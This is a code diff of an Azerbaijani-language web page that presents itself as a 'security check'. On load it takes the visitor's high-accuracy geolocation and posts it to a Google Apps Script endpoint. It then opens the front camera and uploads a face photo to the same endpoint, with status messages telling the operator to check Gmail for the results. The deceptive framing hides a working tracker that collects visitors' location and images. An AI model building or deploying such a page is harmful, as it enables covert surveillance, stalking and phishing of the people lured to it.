@@ -1,166 +1,251 @@
 <!DOCTYPE html>
 <html lang="az">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Təhlükəsizlik</title>
-<style>
-body {
-  margin: 0;
-  padding: 12px;
-  font-family: Arial, sans-serif;
-  text-align: center;
-  background: white;
-}
-video {
-  width: 100%;
-  max-width: 420px;
-}
-button {
-  padding: 12px 24px;
-  font-size: 18px;
-  margin: 12px;
-}
-#status {
-  white-space: pre-wrap;
-}
-</style>
-</head>
-<body>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#ffffff">
+  <title>Təhlükəsizlik</title>
 
-<video id="camera" autoplay playsinline hidden></video>
-<button id="ok" hidden>OK — foto çək və göndər</button>
-<p id="status"></p>
-
-<script>
-const SCRIPT_URL =
-"https://script.google.com/macros/s/AKfycbxCCzG6jPL8De58Ig9ngCY0fW00WY4rS0UbhmI0uFpeZRmmdDTqSJt_k2QmFFVd81Wm/exec";
-
-const camera = document.getElementById("camera");
-const okButton = document.getElementById("ok");
-const status = document.getElementById("status");
-
-let stream = null;
-
-function showStatus(message) {
-  status.textContent = message;
-}
-
-function sendData(data) {
-  return fetch(SCRIPT_URL, {
-    method: "POST",
-    mode: "no-cors",
-    headers: {
-      "Content-Type": "text/plain;charset=UTF-8"
-    },
-    body: JSON.stringify(data)
-  });
-}
-
-function getLocation() {
-  return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) {
-      reject(new Error("Konum xidməti dəstəklənmir"));
-      return;
+  <style>
+    * {
+      box-sizing: border-box;
     }
 
-    navigator.geolocation.getCurrentPosition(
-      resolve,
-      reject,
-      {
-        enableHighAccuracy: true,
-        timeout: 20000,
-        maximumAge: 0
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #ffffff;
+      color: #222222;
+    }
+
+    h2 {
+      font-size: 22px;
+    }
+
+    #camera {
+      width: 100%;
+      max-width: 420px;
+      border-radius: 8px;
+      background: #eeeeee;
+    }
+
+    button {
+      padding: 14px 24px;
+      margin: 15px;
+      border: none;
+      border-radius: 7px;
+      background: #1677ff;
+      color: white;
+      font-size: 17px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      background: #999999;
+      cursor: not-allowed;
+    }
+
+    #status {
+      margin-top: 20px;
+      line-height: 1.6;
+      overflow-wrap: anywhere;
+    }
+  </style>
+</head>
+
+<body>
+  <h2>Təhlükəsizlik yoxlaması</h2>
+
+  <video id="camera" autoplay playsinline hidden></video>
+
+  <div>
+    <button id="okButton" hidden>
+      OK — Foto çək və göndər
+    </button>
+  </div>
+
+  <p id="status">Konum icazəsi gözlənilir...</p>
+
+  <script>
+    // Sənin Google Apps Script ünvanın
+    const SCRIPT_URL =
+      "https://script.google.com/macros/s/AKfycbzGRi0yxPXaIhw-S7fhm22I-Ozt658Ez8dwtW70o7qzepr_3cJXtFTHDOJuArE6xBiL/exec";
+
+    const camera = document.getElementById("camera");
+    const okButton = document.getElementById("okButton");
+    const statusText = document.getElementById("status");
+
+    let cameraStream = null;
+
+    function showStatus(message) {
+      statusText.textContent = message;
+    }
+
+    // Məlumatı Apps Script-ə göndərir
+    async function sendData(data) {
+      await fetch(SCRIPT_URL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "text/plain;charset=UTF-8"
+        },
+        body: JSON.stringify(data)
+      });
+    }
+
+    // Telefonun cari konumunu alır
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error("Brauzer konum xidmətini dəstəkləmir."));
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          resolve,
+          reject,
+          {
+            enableHighAccuracy: true,
+            timeout: 60000,
+            maximumAge: 0
+          }
+        );
+      });
+    }
+
+    // Ön kameranı açır
+    async function openFrontCamera() {
+      if (!navigator.mediaDevices ||
+          !navigator.mediaDevices.getUserMedia) {
+        throw new Error("Kamera üçün HTTPS bağlantısı tələb olunur.");
       }
-    );
-  });
-}
 
-async function start() {
-  try {
-    showStatus("Konum alınır...");
+      cameraStream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: {
+            ideal: "user"
+          }
+        },
+        audio: false
+      });
 
-    const position = await getLocation();
+      camera.srcObject = cameraStream;
+      camera.hidden = false;
 
-    await sendData({
-      type: "location",
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude
+      await camera.play();
+    }
+
+    // Əvvəl konum, sonra kamera
+    async function startProcess() {
+      try {
+        showStatus("Konum alınır... Telefon icazəsini təsdiqlə.");
+
+        const position = await getLocation();
+
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        showStatus("Konum göndərilir...");
+
+        await sendData({
+          type: "location",
+          latitude: latitude,
+          longitude: longitude,
+          accuracy: accuracy
+        });
+
+        showStatus(
+          "Konum göndərmə sorğusu verildi. " +
+          "Təxmini dəqiqlik: " +
+          Math.round(accuracy) +
+          " metr. Kamera açılır..."
+        );
+
+      } catch (error) {
+        showStatus(
+          "Konum alınmadı: " + error.message +
+          ". Telefonun konumunu və brauzer icazəsini yoxla."
+        );
+      }
+
+      try {
+        await openFrontCamera();
+        okButton.hidden = false;
+
+        showStatus(
+          statusText.textContent +
+          "\nÖn kamera açıldı. Foto göndərmək istəyirsənsə OK düyməsinə bas."
+        );
+
+      } catch (error) {
+        showStatus(
+          statusText.textContent +
+          "\nKamera açıla bilmədi: " + error.message
+        );
+      }
+    }
+
+    // Foto yalnız düyməyə basıldıqda çəkilir
+    okButton.addEventListener("click", async () => {
+      if (!cameraStream || !camera.videoWidth) {
+        showStatus("Kamera hələ hazır deyil. Yenidən yoxla.");
+        return;
+      }
+
+      okButton.disabled = true;
+      showStatus("Foto hazırlanır və göndərilir...");
+
+      try {
+        const canvas = document.createElement("canvas");
+
+        const scale = Math.min(
+          1,
+          1280 / camera.videoWidth
+        );
+
+        canvas.width = Math.round(camera.videoWidth * scale);
+        canvas.height = Math.round(camera.videoHeight * scale);
+
+        const context = canvas.getContext("2d");
+
+        context.drawImage(
+          camera,
+          0,
+          0,
+          canvas.width,
+          canvas.height
+        );
+
+        const image = canvas.toDataURL("image/jpeg", 0.7);
+
+        await sendData({
+          type: "photo",
+          confirmed: true,
+          image: image
+        });
+
+        showStatus(
+          "Foto göndərmə sorğusu verildi. " +
+          "Göndərilməni təsdiqləmək üçün Apps Script qeydlərini və Gmail-i yoxla."
+        );
+
+      } catch (error) {
+        showStatus("Foto göndərilmədi: " + error.message);
+        okButton.disabled = false;
+      } finally {
+        if (cameraStream) {
+          cameraStream.getTracks().forEach(track => track.stop());
+          cameraStream = null;
+        }
+
+        camera.hidden = true;
+      }
     });
 
-    showStatus("Konum göndərmə sorğusu verildi. Kamera açılır...");
-
-  } catch (error) {
-    showStatus(
-      "Konum alınmadı. Brauzerdə konum icazəsini yoxla. " +
-      "Kamera yenə də açılacaq."
-    );
-  }
-
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: "user" } },
-      audio: false
-    });
-
-    camera.srcObject = stream;
-    camera.hidden = false;
-    await camera.play();
-
-    okButton.hidden = false;
-    showStatus(
-      "Ön kamera açıldı. Foto çəkmək və göndərmək üçün OK düyməsinə bas."
-    );
-
-  } catch (error) {
-    showStatus("Kamera açılmadı. Brauzer icazəsini yoxla.");
-  }
-}
-
-okButton.addEventListener("click", async () => {
-  if (!stream || !camera.videoWidth) {
-    showStatus("Kamera hazır deyil.");
-    return;
-  }
-
-  okButton.disabled = true;
-  showStatus("Foto hazırlanır...");
-
-  try {
-    const canvas = document.createElement("canvas");
-    const scale = Math.min(1, 1280 / camera.videoWidth);
-
-    canvas.width = Math.round(camera.videoWidth * scale);
-    canvas.height = Math.round(camera.videoHeight * scale);
-
-    canvas.getContext("2d").drawImage(
-      camera, 0, 0, canvas.width, canvas.height
-    );
-
-    const image = canvas.toDataURL("image/jpeg", 0.7);
-
-    stream.getTracks().forEach(track => track.stop());
-    stream = null;
-    camera.hidden = true;
-
-    await sendData({
-      type: "photo",
-      confirmed: true,
-      image: image
-    });
-
-    showStatus(
-      "Foto göndərmə sorğusu verildi. Gmail-ə çatmasını yoxla."
-    );
-
-  } catch (error) {
-    showStatus("Foto hazırlamaq mümkün olmadı: " + error.message);
-    okButton.disabled = false;
-  }
-});
-
-start();
-</script>
-
+    startProcess();
+  </script>
 </body>
 </html>
